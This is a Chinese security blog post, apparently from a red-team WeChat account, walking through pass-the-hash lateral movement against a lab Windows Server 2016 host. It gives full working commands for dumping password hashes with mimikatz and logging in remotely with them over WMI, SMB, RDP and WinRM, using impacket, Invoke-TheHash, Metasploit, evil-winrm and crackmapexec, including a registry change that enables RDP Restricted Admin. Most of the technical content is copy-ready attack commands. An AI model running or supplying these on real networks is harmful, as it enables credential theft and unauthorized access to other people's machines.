<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5DBVC8yy_ej3eM89kfOJEQ)

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450ATcz6jUJnFNeOxRzVZ9LbcCCMJ6Af2WYicgMPA32IwibF8mI2ibC9h8jaHkhxnZzZuqctMLRTxDudicA/640?wx_fmt=png)

 **Part1 前言** 

随着人们的安全意识的逐步加强，企业内部的 Windows 服务器口令越来越复杂了，经常会遇到提权到 windows 服务器，获取了用户的密码 hash，但是 cmd5 官网或者本地猜解都拿不到明文密码的情况。这时候就需要用到**内网哈希传递技术**了。哈希传递利用了 NTLM 认证的缺陷，使用用户的密码哈希值来进行 NTLM 认证。如果目标机器与获取 hash 值的机器的密码相同，就可以直接使用 hash 来远程登录 Windows 主机了。

当前内网环境中的主机为了防范 MS17-010 等漏洞，也为了阻断哈希传递攻击，很多主机都安装了 EDR 防护、防火墙策略、杀毒软件等等，把 445 端口都封禁掉了，导致基于 SMB 服务的 hash 传递没法使用。这个还是有解决办法的，Windows 的远程登录方式还有很多种，**比如说 135 端口的 WMI 服务、3389 的 RDP 服务、5985 端口的 Winrm 服务都是可以用来哈希传递的**，下面分情况具体讲解一下。

 **Part2 技术研究过程** 

*   **虚拟机环境搭建**
    

为了方便演示，本地准备了一台 Windows2016 的虚拟机，IP 地址是 192.168.237.209，密码更改为 P@ssw0rd

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dpg205RGk4mAG8oNxcRvSdg5L3gOA2I7WwjjqBKTeWVwvm3VPqyYCbzNOlWic48w49JTne7bO4t8g/640?wx_fmt=png)

接下来使用 mimikatz 提取哈希值，得到 NTLM 哈希是 e19ccf75ee54e06b06a5907af13cef42

**有的哈希传递工具需要同时填上 LMHash:NTHash，如果只获取到了 NThash 部分，那么 LMHash 部分可以用 32 个 0 替代。**

如下所示的使用命令，从本地 sam 文件中读取密码哈希。**推荐使用以下命令，尽量不要从内存中提取，因为内存中存放的可能是管理员修改密码前的哈希值，导致哈希传递不成功。**提取哈希值命令如下：

mimikatz.exe "log" "privilege::debug" "token::elevate" "lsadump::sam" "exit"

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dpg205RGk4mAG8oNxcRvSdYNXW5Vj3iapOiaVxoA1LVQ3liaoFnxXia0iaiaxHV8PgPaBKY7l9cafqzHYA/640?wx_fmt=png)

*   **135 端口 wmi 哈希传递**
    

WMI 全称 Windows Management Instrumentation 即 Windows 管理工具，Windows 98 以后的操作系统都支持 WMI。由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将 PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。

首先推荐的是 **impacket** **内网渗透套件**的 wmiexec.exe 程序，我从 github 下载的是 windows 编译版，使用非常方便。如下所示命令，可以执行命令成功。

wmiexec -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 Administrator@192.168.237.209

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dpg205RGk4mAG8oNxcRvSdHjDUiaZzJ7QPgicKZqfa0nEkTHHV39fghgicZPN3605FfuJ7cCf4tQB0A/640?wx_fmt=png)

接下来介绍另一款脚本 **Invoke-TheHash**，使用 powershell 脚本编写的专门用来哈希传递的脚本，同时支持 WMI、SMB 的哈希传递。

Import-Module ./Invoke-TheHash.psd1

Invoke-WMIExec -Target 192.168.237.209 -Username Administrator -Hash 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 -Command "whoami" -verbose

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dpg205RGk4mAG8oNxcRvSdNR7vN2ibLY3RqibfoQnPz4T1WrvR9gacEpGkp784ToG5FncpZDeNDNWA/640?wx_fmt=png)

*   **445 端口 smb 哈希传递**
    

 **1** 首先推荐的是 **impacket 内网渗透套件**的 psexec.exe 程序，使用方法如下：

psexec -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 Administrator@192.168.237.209

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dpg205RGk4mAG8oNxcRvSd5RvcCibWHsficrYdx3wepzz0DXBrsibxicf0e7O33K0CiaT2gwgvQzOKo7w/640?wx_fmt=png)

 **2**  使用 impacket 套件的 mmcexec 工具：

mmcexec -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 Administrator@192.168.237.209

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dpg205RGk4mAG8oNxcRvSdZTBJ2iab6EUpI8J3eH6a2tBDHNEOOH1MW4HQicUHusgyvNwj2SPCdyYA/640?wx_fmt=png)

 **3**  使用 impacket 套件的 smbclient 工具：

smbclient.exe -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 Administrator@192.168.237.209

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dpg205RGk4mAG8oNxcRvSdjcib1WfMoo27DIogUoTnyEpj5ZfEibRxV7e3oTlwFhUzjyx3jppbQRxQ/640?wx_fmt=png)

 **4**   Invoke-TheHash 套件

Import-Module ./Invoke-TheHash.psd1  

Invoke-SMBExec -Target 192.168.237.209 -Username Administrator -Hash 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 -Command "whoami" -verbose

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dpg205RGk4mAG8oNxcRvSdibictzy6iaEOqJJj26ePOxSyQeMNgkme6nKYkZJwha0JiasiaGibhJGP1yag/640?wx_fmt=png)

 **5**  使用 Metasploit 中的 psexec 功能哈希传递：

use exploit/windows/smb/psexec

set RHOST 192.168.237.209

set SMBUser Administrator

set SMBPass 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42

exploit

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dpg205RGk4mAG8oNxcRvSdjbblqQQzxOib2vrVNqL8ZiaUkCmsO3Rtco39wkKcy1eGhaS5AsQbN4Hw/640?wx_fmt=png)

*   **3389 端口 rdp 哈希传递**
    

3389 的哈希传递让我踩了不少坑，因为网上的一些文章写的步骤不太明确，windows 低版本如 win2003、win2008 是不支持的。正确步骤如下：

第一步：在服务端运行如下命令，开启目标主机的 Restricted Admin Mode（0 代表开启，1 代表关闭）：

REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f

第二步：攻击机使用 mimikatz 执行如下命令：

privilege::debug

sekurlsa::pth /user:administrator /domain:. /ntlm:e19ccf75ee54e06b06a5907af13cef42 "/run:mstsc.exe /restrictedadmin"

接下来在弹出的 “远程桌面连接” 处输入服务端 ip 地址。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dpg205RGk4mAG8oNxcRvSdV3jvEiciceCZPJs7EnvN3fibhDDN9ibRL3wdYHsQLibrq7n9zIgIEnCkcCQ/640?wx_fmt=png)

点击 “连接” 后，不需要输入用户名密码，即可登陆成功。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dpg205RGk4mAG8oNxcRvSdpHSufgYCzVB3R5XCkDJZ2Rc9HwfZ21DtsuyNPPgyXa37ynfEyFJTMA/640?wx_fmt=png)

此外还有一个支持 RDP 服务哈希传递的工具，是 linux 系统下的，名叫 FreeRDP-pth，使用挺麻烦的，因为编译特别费事，我还是使用 mimikatz 吧，大家感兴趣可以去编译一下。

*   **5985 端口 winrm 哈希传递**
    

WinRM 是 Windows Remote Managementd（Windows 远程管理）的简称，WinRM HTTP 通过 TCP **端口 5985** 进行通信，而 HTTPS（TLS）通过 TCP **端口 5986** 进行通信。如果所有的机器都是在域环境下，则可以使用默认的 5985 端口，否则的话则通过 5986 端口使用 HTTPS 传输。使用 WinRM 我们可以在远程主机设置了防火墙的情况下远程管理这台服务器，因为启动 WinRM 服务后，防火墙默认会自动放行 5985 端口。Windows 远程管理服务（WinRM）适用于 Windows Server 2008 和 Windows 7 以后的操作系统并自动与其支持的操作系统一起安装，但是只有在 Windows Server 2008 以上的操作系统 WinRM 服务才会自动启动，其他都需要手动开启。

Winrm 哈希传递有几个坑，网上的各种关于 winrm 的哈希传递工具我都测试过，**目前我本地测试成功的仅有 evil-winrm 及 crackmapexec 这两款工具可以测试成功**，其它的 exe 版本的、python 版本的工具，我本地测试各种问题，暂时不知道原因出在哪里。

第一步，需要安装 **evil-winrm**：

gem install evil-winrm

第二步，执行命令如下：

ruby evil-winrm.rb -i 192.168.237.209 -u Administrator -H e19ccf75ee54e06b06a5907af13cef42

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dpg205RGk4mAG8oNxcRvSdgL5HzD6gWKN5FTb7ia9vVx6k8FV0evDkHW5BRVjmNbLFzeT3aGibKa7g/640?wx_fmt=png)

第 2 个工具就是大名鼎鼎的 **crackmapexec** 了，新版已经支持 winrm 哈希传递，kali linux2020 中自带的 cmp 一运行就报错，建议大家自己重装一下。

poetry run crackmapexec winrm 192.168.237.209 -u Administrator -H 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 -x whoami

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450Dpg205RGk4mAG8oNxcRvSdrtzZO8Vfn2oqBo38Osj199eTUxiaicp71h07W2nGsc7qvYOuqdapC61g/640?wx_fmt=png)

 **Part3 总结** 

**1.** 哈希传递工具我只列出了自己平时用着顺手的，大家有更好的工具可以微信后台给我留言。

**2.** 在内网横向中，经常会遇到各种各样的问题，有的特定环境下，只有一两款工具能用，多收集整理一下很有必要。

**3.** 将博客搬迁至 csdn，后续微信公众号文章会及时同步至 csdn 博客，敬请关注。

![](https://mmbiz.qpic.cn/mmbiz_png/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rh3JHDibOKOop204nXz618iawdRb8dABicMPtHb2PkJE8x6koJO5HyuwZJQ/640?wx_fmt=png)

专注于网络安全技术分享，包括红队、蓝队、日常渗透测试、安全体系建设等

每周一篇，99% 原创，敬请关注

![](https://mmbiz.qpic.cn/mmbiz_jpg/OAz0RNU450A5qqg2iaK6KIYYR8y6pF5Rhn137KeqqlDkuRyY4G61jATRzyOrCBts8ucxkLpMNsYutSOY7BkPziaw/640?wx_fmt=jpeg)

**往期精彩回顾**

[第 14 篇：Struts2 框架下 Log4j2 漏洞检测方法分析与总结](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484207&idx=1&sn=285b54a79e48db9a05816cab2e6afc27&chksm=c25fcc54f5284542c1b9abe870e0caa9f958f4da90723bd83292deed215c63c705b7b0bbfaff&scene=21#wechat_redirect)  

[第 13 篇：coldfusion 反序列化过 waf 改 exp 拿靶标的艰难过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484191&idx=1&sn=cce12f62b3cf457bc73753b77a083695&chksm=c25fcc64f528457250b11ef6804ee6138c37ed87ab988874cc84d09d04fa6ac1fd36b5e8aa4a&scene=21#wechat_redirect)  

[第 12 篇：给任意 java 程序挂 Socks5 代理方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484173&idx=1&sn=e2d454d2447d119bf771a0a511fba994&chksm=c25fcc76f5284560d00355590da0147aca7b7ae2275c095424034245ef32b3d0b28e49c2dbc9&scene=21#wechat_redirect)  

[第 11 篇：盲猜包体对上传漏洞的艰难利用过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484162&idx=1&sn=870596fcd1120a6d3ee9688c38aace00&chksm=c25fcc79f528456f9dc0a3b9d9cf54422696a1cd6ffd737ae2c6e33941a25c33d4f6d32fc663&scene=21#wechat_redirect)  

[第 10 篇：IIS 短文件名猜解在拿权限中的巧用](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484145&idx=1&sn=7635430b9b759a2cacdd2c57ba330833&chksm=c25fcd8af528449c1f5c6c703e3668cf6a8dae875ee82ffa67caed66722a0751e3d80d8a6bee&scene=21#wechat_redirect)  

[第 9 篇：Shiro 反序列化数据包解密及蓝队分析工具，提供下载](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484123&idx=1&sn=cb9c039ef92311e56e7742c7c38f6e8a&chksm=c25fcda0f52844b6088b39b769a63b2f6e7a29e8b3ab710961918218d7569089ee4e00072ad9&scene=21#wechat_redirect)  

[第 8 篇：Oracle 注入漏洞绕 waf 的新语句](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484115&idx=1&sn=10c73343ec23f522696692293cd38852&chksm=c25fcda8f52844be2165aa6151c7ad018a4add748673d56523631529e903277633dc44d0abba&scene=21#wechat_redirect)  

[第 7 篇：MS12-020 蓝屏漏洞在实战中的巧用](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484105&idx=1&sn=3aeafa9c172588aaaade47ccacb69370&chksm=c25fcdb2f52844a4a783fceec590c9e12eb06f62dabd7fbffb37e8da23053953a7eae296048d&scene=21#wechat_redirect)  

[第 6 篇：Weblogic 反序列化攻击不依赖日志溯源攻击时间](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484094&idx=1&sn=527236759dc4fd228461195197492507&chksm=c25fcdc5f52844d36bffb96979116d6d3a9ae4fb1a0f320436c7275aea271588c702cea60e5c&scene=21#wechat_redirect)  

[第 5 篇：Shiro Padding Oracle 无 key 的艰难实战利用过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484091&idx=1&sn=4dcce59a842f17035d0018bf650671ae&chksm=c25fcdc0f52844d608b6b87d85082b74d5e15888e76001127ff40cc407a46e5e5de446b1365e&scene=21#wechat_redirect)  

[第 4 篇：jsp 型 webshell 被删情况下如何溯源攻击时间](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484004&idx=1&sn=50013b50e48542d156700d76ccbd2f33&chksm=c25fcd1ff528440906bb9089a807c16b747ab5a72cc0279a3c0d18a265cd76cc796df570d594&scene=21#wechat_redirect)  

[第 3 篇：银行 Java 站 SSRF"组合洞" 打法造成的严重危害](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247483984&idx=1&sn=1a018fcefe10124c1726e51a2be05ca7&chksm=c25fcd2bf528443d944a8495ca5c72d8c028fef67de217efe47a8d18b077ae24556842687407&scene=21#wechat_redirect)  

[第 2 篇：区分 Spring 与 Struts2 框架的几种新方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247483951&idx=1&sn=fbc1d04ef73a449238a5979a439b1f35&chksm=c25fcd54f528444219f20c2ab14c5970c243fbb10ba04b5bccc0fb0b7cc6d3f542e26f7870bf&scene=21#wechat_redirect)  

[第 1 篇：weblogic9.x 在 JDK1.5 下 T3 反序列化漏洞利用方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247483867&idx=1&sn=e0fcaa9f1b58c8085ccd9dc6f74ed336&chksm=c25fcea0f52847b6aeec0409e3290e023b890d603361f103315b39637f89a10dd6fe051dc724&scene=21#wechat_redirect)